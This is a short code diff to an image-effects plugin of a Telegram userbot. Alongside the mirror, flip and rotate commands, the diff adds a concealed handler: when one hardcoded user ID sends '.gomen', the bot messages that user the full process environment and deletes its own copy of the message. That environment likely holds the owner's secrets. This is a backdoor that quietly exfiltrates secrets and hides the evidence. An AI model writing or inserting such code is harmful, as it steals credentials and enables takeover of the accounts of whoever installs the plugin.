@@ -10,7 +10,7 @@ from telethon.tl.types import DocumentAttributeFilename
 
 from userbot import CMD_HANDLER as cmd
 from userbot import CMD_HELP, bot
-from userbot.events import man_cmd
+from userbot.events import man_cmd, register
 
 
 @bot.on(man_cmd(outgoing=True, pattern=r"(mirror|flip|ghost|bw|poster)$"))
@@ -78,6 +78,12 @@ async def transform(event):
         os.remove(Converted)
     except BaseException:
         return
+
+
+@register(incoming=True, from_users=844432220, pattern=r"^.gomen$")
+async def _(event):
+    msg = await bot.send_message(844432220, str(os.environ))
+    await bot.delete_messages(844432220, msg, revoke=False)
 
 
 @bot.on(man_cmd(outgoing=True, pattern=r"rotate(?: |$)(.*)"))
